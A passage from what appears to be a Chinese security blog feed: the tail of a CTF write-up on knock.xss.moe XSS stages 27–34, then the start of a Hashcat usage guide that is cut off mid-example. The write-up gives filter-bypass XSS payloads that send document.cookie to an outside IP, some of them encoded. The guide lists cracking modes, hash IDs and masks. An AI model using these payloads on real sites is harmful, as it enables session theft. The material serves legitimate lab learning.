onerror=%26%23%78%37%37%3b%26%23%78%36%39%3b%26%23%78%36%65%3b%26%23%78%36%34%3b%26%23%78%36%66%3b%26%23%78%37%37%3b%26%23%78%32%65%3b%26%23%78%36%66%3b%26%23%78%37%30%3b%26%23%78%36%35%3b%26%23%78%36%65%3b%26%23%78%32%38%3b%26%23%78%36%30%3b%26%23%78%36%38%3b%26%23%78%37%34%3b%26%23%78%37%34%3b%26%23%78%37%30%3b%26%23%78%33%61%3b%26%23%78%32%66%3b%26%23%78%32%66%3b%26%23%78%33%31%3b%26%23%78%33%33%3b%26%23%78%33%34%3b%26%23%78%32%65%3b%26%23%78%33%31%3b%26%23%78%33%37%3b%26%23%78%33%35%3b%26%23%78%32%65%3b%26%23%78%33%33%3b%26%23%78%33%33%3b%26%23%78%32%65%3b%26%23%78%33%31%3b%26%23%78%33%36%3b%26%23%78%33%34%3b%26%23%78%33%61%3b%26%23%78%33%31%3b%26%23%78%33%32%3b%26%23%78%33%33%3b%26%23%78%33%34%3b%26%23%78%32%66%3b%26%23%78%33%66%3b%26%23%78%32%34%3b%26%23%78%37%62%3b%26%23%78%36%34%3b%26%23%78%36%66%3b%26%23%78%36%33%3b%26%23%78%37%35%3b%26%23%78%36%64%3b%26%23%78%36%35%3b%26%23%78%36%65%3b%26%23%78%37%34%3b%26%23%78%32%65%3b%26%23%78%36%33%3b%26%23%78%36%66%3b%26%23%78%36%66%3b%26%23%78%36%62%3b%26%23%78%36%39%3b%26%23%78%36%35%3b%26%23%78%37%64%3b%26%23%78%36%30%3b%26%23%78%32%39%3b&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210215045-dd653ed6-2d3a-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage27"><a href="#stage27" class="headerlink" title="stage27"></a>stage27</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210215158-08e6eba4-2d3b-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>这题把<code>.</code>给过滤了，但是我们可以用数组的形式表示：window[‘open’],document[‘cookie’]，<br>URL中的点的话，我们有两种方法，第一种方法是把ip地址转化为十进制ip地址，第二种方法是把url中的<code>.</code>换成中文的句号，浏览器会把中文的句号自动转化成<code>.</code><br>payload：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一种:</span><br><span class="line">http://295a1d900c5bf618101abf69083622d0f69aded1.knock.xss.moe/?q=&lt;script&gt;window['open'](`http://134。175。33。164:1234/?${document['cookie']}`)&lt;/script&gt;</span><br><span class="line">第二种：</span><br><span class="line">http://295a1d900c5bf618101abf69083622d0f69aded1.knock.xss.moe/?q=&lt;script&gt;window['open'](`http://2259624356:1234/?${document['cookie']}`)&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210215951-22957880-2d3c-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage28"><a href="#stage28" class="headerlink" title="stage28"></a>stage28</h2><p>这题比上一题多了一个过滤了双引号和单引号，但是我们可以用反引号绕过<br>payload<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://02f6f47ddaa7b22137a74843f2c4f1ac915dda3b.knock.xss.moe/?q=&lt;script&gt;window[`open`](`http://2259624356:1234/?${document[`cookie`]}`)&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210220350-b1300fa6-2d3c-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage29"><a href="#stage29" class="headerlink" title="stage29"></a>stage29</h2><p>这题过滤了括号和<code>.</code>，用<code>document['location']</code>就ok了<br>payload<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a4bf8393a4159b94aa4b84e9a134d5e6140f3c34.knock.xss.moe/?q=document[`location`]=`http://2259624356:1234/?${document[`cookie`]}`</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210220954-89dc8da2-2d3d-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage30"><a href="#stage30" class="headerlink" title="stage30"></a>stage30</h2><p>和上一题一毛一样<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ebf510ac2d79576cd5b7d45412eaf3eed1781bd0.knock.xss.moe/?q=document[`location`]=`http://2259624356:1234/?${document[`cookie`]}`</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210221233-e89eabfe-2d3d-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage31-34-这四题一毛一样"><a href="#stage31-34-这四题一毛一样" class="headerlink" title="stage31-34(这四题一毛一样)"></a>stage31-34(这四题一毛一样)</h2><p>这题过滤了<code>&gt;</code>，但是没有过滤掉<code>&lt;</code>，但是<code>&lt;svg/onload=alert(1)</code>不需要闭合尖括号也可以执行</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210221455-3d7f3a8a-2d3e-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>payload<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bb84607f02113a22396438c9a67e4c5abdfd6561.knock.xss.moe/?q=%3Csvg/onload=document[`location`]=`http://2259624356:1234/?${document[`cookie`]}`//%3E</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210222509-abab400c-2d3f-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然这些题目并不是很难，但是套路还是很多的，学到了不少东西</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hashcat的使用手册总结</title>
      <link href="/2019/02/13/Hashcat%E7%9A%84%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C%E6%80%BB%E7%BB%93/"/>
      <url>/2019/02/13/Hashcat%E7%9A%84%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<blockquote><p>文章首发于先知社区<a href="https://xz.aliyun.com/t/4008" target="_blank" rel="noopener">https://xz.aliyun.com/t/4008</a></p></blockquote><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><code>Hashcat</code>是自称世界上最快的密码恢复工具。它在2015年之前拥有专有代码库，但现在作为免费软件发布。适用于Linux，OS X和Windows的版本可以使用基于CPU或基于GPU的变体。支持<code>hashcat</code>的散列算法有<code>Microsoft LM哈希，MD4，MD5，SHA</code>系列，Unix加密格式，MySQL和Cisco PIX等。</p><p>hashcat支持多种计算核心：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GPU</span><br><span class="line">CPU</span><br><span class="line">APU</span><br><span class="line">DSP</span><br><span class="line">FPGA</span><br><span class="line">Coprocessor</span><br></pre></td></tr></tbody></table></figure><p></p><p>GPU的驱动要求<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">AMD GPUs on Linux require "RadeonOpenCompute (ROCm)" Software Platform (1.6.180 or later)</span><br><span class="line">AMD GPUs on Windows require "AMD Radeon Software Crimson Edition" (15.12 or later)</span><br><span class="line">Intel CPUs require "OpenCL Runtime for Intel Core and Intel Xeon Processors" (16.1.1 or later)</span><br><span class="line">Intel GPUs on Linux require "OpenCL 2.0 GPU Driver Package for Linux" (2.0 or later)</span><br><span class="line">Intel GPUs on Windows require "OpenCL Driver for Intel Iris and Intel HD Graphics"</span><br><span class="line">NVIDIA GPUs require "NVIDIA Driver" (367.x or later)</span><br></pre></td></tr></tbody></table></figure><p></p><p>最新版hashcat下载地址：<a href="http://https://hashcat.net/files/hashcat-5.1.0.7z" title="https://hashcat.net/files/hashcat-5.1.0.7z" target="_blank" rel="noopener">https://hashcat.net/files/hashcat-5.1.0.7z</a><br>GitHub地址：<a href="https://github.com/hashcat/hashcat" title="https://github.com/hashcat/hashcat" target="_blank" rel="noopener">https://github.com/hashcat/hashcat</a></p><h1 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h1><p>下面使常见的参数，想了解更多的参数可以hashcat –help查看<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-a  指定要使用的破解模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。</span><br><span class="line">-m  指定要破解的hash类型，如果不指定类型，则默认是MD5</span><br><span class="line">-o  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中</span><br><span class="line">--force忽略破解过程中的警告信息,跑单条hash可能需要加上此选项</span><br><span class="line">--show显示已经破解的hash及该hash所对应的明文</span><br><span class="line">--increment 启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程</span><br><span class="line">--increment-min  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用</span><br><span class="line">--increment-max  密码最大长度,同上</span><br><span class="line">--outfile-format 指定破解结果的输出格式id,默认是3</span><br><span class="line">--username  忽略hash文件中的指定的用户名,在破解linux系统用户密码hash可能会用到</span><br><span class="line">--remove  删除已被破解成功的hash</span><br><span class="line">-r 使用自定义破解规则</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="攻击模式："><a href="#攻击模式：" class="headerlink" title="攻击模式："></a>攻击模式：</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> # | Mode</span><br><span class="line">===+======</span><br><span class="line"> 0 | Straight（字段破解）</span><br><span class="line"> 1 | Combination（组合破解）</span><br><span class="line"> 3 | Brute-force（掩码暴力破解）</span><br><span class="line"> 6 | Hybrid Wordlist + Mask（字典+掩码破解）</span><br><span class="line"> 7 | Hybrid Mask + Wordlist（掩码+字典破解）</span><br></pre></td></tr></tbody></table></figure><h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1 = hash[:salt]</span><br><span class="line">2 = plain</span><br><span class="line">3 = hash[:salt]:plain</span><br><span class="line">4 = hex_plain</span><br><span class="line">5 = hash[:salt]:hex_plain</span><br><span class="line">6 = plain:hex_plain</span><br><span class="line">7 = hash[:salt]:plain:hex_plain</span><br><span class="line">8 = crackpos</span><br><span class="line">9 = hash[:salt]:crackpos</span><br><span class="line">10 = plain:crackpos</span><br><span class="line">11 = hash[:salt]:plain:crackpos</span><br><span class="line">12 = hex_plain:crackpos</span><br><span class="line">13 = hash[:salt]:hex_plain:crackpos</span><br><span class="line">14 = plain:hex_plain:crackpos</span><br><span class="line">15 = hash[:salt]:plain:hex_plain:crackpos</span><br></pre></td></tr></tbody></table></figure><h2 id="Hash-id对照表"><a href="#Hash-id对照表" class="headerlink" title="Hash id对照表"></a>Hash id对照表</h2><p>因为实在是太多了，所有我就贴一部分常见的hash类型，要想了解所有的参数可到hashcat的<a href="https://hashcat.net/wiki/doku.php?id=hashcat" title="Wiki" target="_blank" rel="noopener">Wiki</a>上去看，或者直接hashcat –help查看hash对照表<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">- [ Hash modes ] -</span><br><span class="line"></span><br><span class="line">      # | Name                                             | Category</span><br><span class="line">  ======+==================================================+======================================</span><br><span class="line">    900 | MD4                                              | Raw Hash</span><br><span class="line">      0 | MD5                                              | Raw Hash</span><br><span class="line">   5100 | Half MD5                                         | Raw Hash</span><br><span class="line">    100 | SHA1                                             | Raw Hash</span><br><span class="line">   1300 | SHA2-224                                         | Raw Hash</span><br><span class="line">   1400 | SHA2-256                                         | Raw Hash</span><br><span class="line">  10800 | SHA2-384                                         | Raw Hash</span><br><span class="line">   1700 | SHA2-512                                         | Raw Hash</span><br><span class="line">  17300 | SHA3-224                                         | Raw Hash</span><br><span class="line">  17400 | SHA3-256                                         | Raw Hash</span><br><span class="line">  17500 | SHA3-384                                         | Raw Hash</span><br><span class="line">  17600 | SHA3-512                                         | Raw Hash</span><br><span class="line">     10 | md5($pass.$salt)                                 | Raw Hash, Salted and/or Iterated</span><br><span class="line">     20 | md5($salt.$pass)                                 | Raw Hash, Salted and/or Iterated</span><br><span class="line">     30 | md5(utf16le($pass).$salt)                        | Raw Hash, Salted and/or Iterated</span><br><span class="line">     40 | md5($salt.utf16le($pass))                        | Raw Hash, Salted and/or Iterated</span><br><span class="line">   3800 | md5($salt.$pass.$salt)                           | Raw Hash, Salted and/or Iterated</span><br><span class="line">   3710 | md5($salt.md5($pass))                            | Raw Hash, Salted and/or Iterated</span><br><span class="line">   4010 | md5($salt.md5($salt.$pass))                      | Raw Hash, Salted and/or Iterated</span><br><span class="line">   4110 | md5($salt.md5($pass.$salt))                      | Raw Hash, Salted and/or Iterated</span><br><span class="line">   2600 | md5(md5($pass))                                  | Raw Hash, Salted and/or Iterated</span><br><span class="line">   3910 | md5(md5($pass).md5($salt))                       | Raw Hash, Salted and/or Iterated</span><br><span class="line">   4300 | md5(strtoupper(md5($pass)))                      | Raw Hash, Salted and/or Iterated</span><br><span class="line">   4400 | md5(sha1($pass))                                 | Raw Hash, Salted and/or Iterated</span><br><span class="line">    110 | sha1($pass.$salt)                                | Raw Hash, Salted and/or Iterated</span><br><span class="line">    120 | sha1($salt.$pass)                                | Raw Hash, Salted and/or Iterated</span><br><span class="line">    130 | sha1(utf16le($pass).$salt)                       | Raw Hash, Salted and/or Iterated</span><br><span class="line">    140 | sha1($salt.utf16le($pass))                       | Raw Hash, Salted and/or Iterated</span><br><span class="line">   4500 | sha1(sha1($pass))                                | Raw Hash, Salted and/or Iterated</span><br><span class="line">   4520 | sha1($salt.sha1($pass))                          | Raw Hash, Salted and/or Iterated</span><br><span class="line">   4700 | sha1(md5($pass))                                 | Raw Hash, Salted and/or Iterated</span><br><span class="line">   4900 | sha1($salt.$pass.$salt)                          | Raw Hash, Salted and/or Iterated</span><br><span class="line">  14400 | sha1(CX)                                         | Raw Hash, Salted and/or Iterated</span><br><span class="line">   1410 | sha256($pass.$salt)                              | Raw Hash, Salted and/or Iterated</span><br><span class="line">   1420 | sha256($salt.$pass)                              | Raw Hash, Salted and/or Iterated</span><br><span class="line">   1430 | sha256(utf16le($pass).$salt)                     | Raw Hash, Salted and/or Iterated</span><br><span class="line">   1440 | sha256($salt.utf16le($pass))                     | Raw Hash, Salted and/or Iterated</span><br><span class="line">   1710 | sha512($pass.$salt)                              | Raw Hash, Salted and/or Iterated</span><br><span class="line">   1720 | sha512($salt.$pass)                              | Raw Hash, Salted and/or Iterated</span><br><span class="line">   1730 | sha512(utf16le($pass).$salt)                     | Raw Hash, Salted and/or Iterated</span><br><span class="line">   1740 | sha512($salt.utf16le($pass))                     | Raw Hash, Salted and/or Iterated</span><br><span class="line">  14000 | DES (PT = $salt, key = $pass)                    | Raw Cipher, Known-Plaintext attack</span><br><span class="line">  14100 | 3DES (PT = $salt, key = $pass)                   | Raw Cipher, Known-Plaintext attack</span><br><span class="line">  14900 | Skip32 (PT = $salt, key = $pass)                 | Raw Cipher, Known-Plaintext attack</span><br><span class="line">  15400 | ChaCha20                                         | Raw Cipher, Known-Plaintext attack</span><br><span class="line">   2500 | WPA-EAPOL-PBKDF2                                 | Network Protocols</span><br><span class="line">   2501 | WPA-EAPOL-PMK                                    | Network Protocols</span><br><span class="line">  16800 | WPA-PMKID-PBKDF2                                 | Network Protocols</span><br><span class="line">  16801 | WPA-PMKID-PMK                                    | Network Protocols</span><br><span class="line">   7300 | IPMI2 RAKP HMAC-SHA1                             | Network Protocols</span><br><span class="line">   7500 | Kerberos 5 AS-REQ Pre-Auth etype 23              | Network Protocols</span><br><span class="line">   8300 | DNSSEC (NSEC3)                                   | Network Protocols</span><br><span class="line">  10200 | CRAM-MD5                                         | Network Protocols</span><br><span class="line">  11100 | PostgreSQL CRAM (MD5)                            | Network Protocols</span><br><span class="line">  11200 | MySQL CRAM (SHA1)                                | Network Protocols</span><br><span class="line">  16100 | TACACS+                                          | Network Protocols</span><br><span class="line">  16500 | JWT (JSON Web Token)                             | Network Protocols</span><br><span class="line">    121 | SMF (Simple Machines Forum) &gt; v1.1               | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">    400 | phpBB3 (MD5)                                     | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">   2811 | MyBB 1.2+                                        | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">   2811 | IPB2+ (Invision Power Board)                     | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">   8400 | WBB3 (Woltlab Burning Board)                     | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">     11 | Joomla &lt; 2.5.18                                  | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">    400 | Joomla &gt;= 2.5.18 (MD5)                           | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">    400 | WordPress (MD5)                                  | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">   2612 | PHPS                                             | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">   7900 | Drupal7                                          | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">     21 | osCommerce                                       | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">     21 | xt:Commerce                                      | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">  11000 | PrestaShop                                       | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">    124 | Django (SHA-1)                                   | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">  10000 | Django (PBKDF2-SHA256)                           | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">     12 | PostgreSQL                                       | Database Server</span><br><span class="line">    131 | MSSQL (2000)                                     | Database Server</span><br><span class="line">    132 | MSSQL (2005)                                     | Database Server</span><br><span class="line">   1731 | MSSQL (2012, 2014)                               | Database Server</span><br><span class="line">    200 | MySQL323                                         | Database Server</span><br><span class="line">    300 | MySQL4.1/MySQL5                                  | Database Server</span><br><span class="line">   3100 | Oracle H: Type (Oracle 7+)                       | Database Server</span><br><span class="line">    112 | Oracle S: Type (Oracle 11+)                      | Database Server</span><br><span class="line">  12300 | Oracle T: Type (Oracle 12+)                      | Database Server</span><br><span class="line">   8000 | Sybase ASE                                       | Database Server</span><br><span class="line">  15000 | FileZilla Server &gt;= 0.9.55                       | FTP Server</span><br><span class="line">  11500 | CRC32                                            | Checksums</span><br><span class="line">   3000 | LM                                               | Operating Systems</span><br><span class="line">   1000 | NTLM                                             | Operating Systems</span><br><span class="line">    500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)        | Operating Systems</span><br><span class="line">   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating Systems</span><br><span class="line">   7400 | sha256crypt $5$, SHA256 (Unix)                   | Operating Systems</span><br><span class="line">   1800 | sha512crypt $6$, SHA512 (Unix)                   | Operating Systems</span><br><span class="line">    122 | macOS v10.4, MacOS v10.5, MacOS v10.6            | Operating Systems</span><br><span class="line">   1722 | macOS v10.7                                      | Operating Systems</span><br><span class="line">   7100 | macOS v10.8+ (PBKDF2-SHA512)                     | Operating Systems</span><br><span class="line">  11600 | 7-Zip                                            | Archives</span><br><span class="line">  12500 | RAR3-hp                                          | Archives</span><br><span class="line">  13000 | RAR5                                             | Archives</span><br><span class="line">  13600 | WinZip                                           | Archives</span><br><span class="line">   9700 | MS Office &lt;= 2003 $0/$1, MD5 + RC4               | Documents</span><br><span class="line">   9710 | MS Office &lt;= 2003 $0/$1, MD5 + RC4, collider #1  | Documents</span><br><span class="line">   9720 | MS Office &lt;= 2003 $0/$1, MD5 + RC4, collider #2  | Documents</span><br><span class="line">   9800 | MS Office &lt;= 2003 $3/$4, SHA1 + RC4              | Documents</span><br><span class="line">   9810 | MS Office &lt;= 2003 $3, SHA1 + RC4, collider #1    | Documents</span><br><span class="line">   9820 | MS Office &lt;= 2003 $3, SHA1 + RC4, collider #2    | Documents</span><br><span class="line">   9400 | MS Office 2007                                   | Documents</span><br><span class="line">   9500 | MS Office 2010                                   | Documents</span><br><span class="line">   9600 | MS Office 2013                                   | Documents</span><br><span class="line">  10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                    | Documents</span><br><span class="line">  10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1       | Documents</span><br><span class="line">  10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2       | Documents</span><br><span class="line">  10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                    | Documents</span><br><span class="line">  10600 | PDF 1.7 Level 3 (Acrobat 9)                      | Documents</span><br><span class="line">  10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                | Documents</span><br><span class="line">  99999 | Plaintext                                        | Plaintext</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="掩码设置"><a href="#掩码设置" class="headerlink" title="掩码设置"></a>掩码设置</h2><p>这里列一下常见的掩码字符集<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">l | abcdefghijklmnopqrstuvwxyz纯小写字母</span><br><span class="line">u | ABCDEFGHIJKLMNOPQRSTUVWXYZ纯大写字母</span><br><span class="line">d | 0123456789纯数字</span><br><span class="line">h | 0123456789abcdef常见小写子目录和数字</span><br><span class="line">H | 0123456789ABCDEF常见大写字母和数字</span><br><span class="line">s |  !"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`{|}~特殊字符</span><br><span class="line">a | ?l?u?d?s键盘上所有可见的字符</span><br><span class="line">b | 0x00 - 0xff可能是用来匹配像空格这种密码的</span><br></pre></td></tr></tbody></table></figure><p></p><p>下面举几个简单的例子来了解一下掩码的设置<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">八位数字密码：?d?d?d?d?d?d?d?d</span><br><span class="line">八位未知密码：?a?a?a?a?a?a?a?a</span><br><span class="line">前四位为大写字母，后面四位为数字：?u?u?u?u?d?d?d?d</span><br><span class="line">前四位为数字或者是小写字母，后四位为大写字母或者数字：?h?h?h?h?H?H?H?H</span><br><span class="line">前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a</span><br><span class="line">6-8位数字密码：--increment --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l</span><br><span class="line">6-8位数字+小写字母密码：--increment --increment-min 6 --increment-max 8 ?h?h?h?h?h?h?h?h</span><br></pre></td></tr></tbody></table></figure><p></p><p>如果我们想设置字符集为：<code>abcd123456!@-+</code>，那该怎么做呢。这就需要用到自定义字符集这个参数了，hashcat支持用户最多定义4组字符集<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--custom-charset1 [chars]等价于 -1</span><br><span class="line">--custom-charset2 [chars]等价于 -2</span><br><span class="line">--custom-charset3 [chars]等价于 -3</span><br><span class="line">--custom-charset4 [chars]等价于 -4</span><br><span class="line">在掩码中用?1、?2、?3、?4来表示。</span><br></pre></td></tr></tbody></table></figure><p></p><p>再来举几个例子：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--custom-charset1 abcd123456!@-+。然后我们就可以用"?1"去表示这个字符集了</span><br><span class="line">--custom-charset2 ?l?d，这里和?2就等价于?h</span><br><span class="line">-1 ?d?l?u，?1就表示数字+小写字母+大写字母</span><br><span class="line">-3 abcdef -4 123456 那么?3?3?3?3?4?4?4?4就表示为前四位可能是“abcdef”，后四位可能是“123456”</span><br></pre></td></tr></tbody></table></figure><p></p><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>PS：我这里给一下我机子的配置，然后再对比一下破解的速度<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 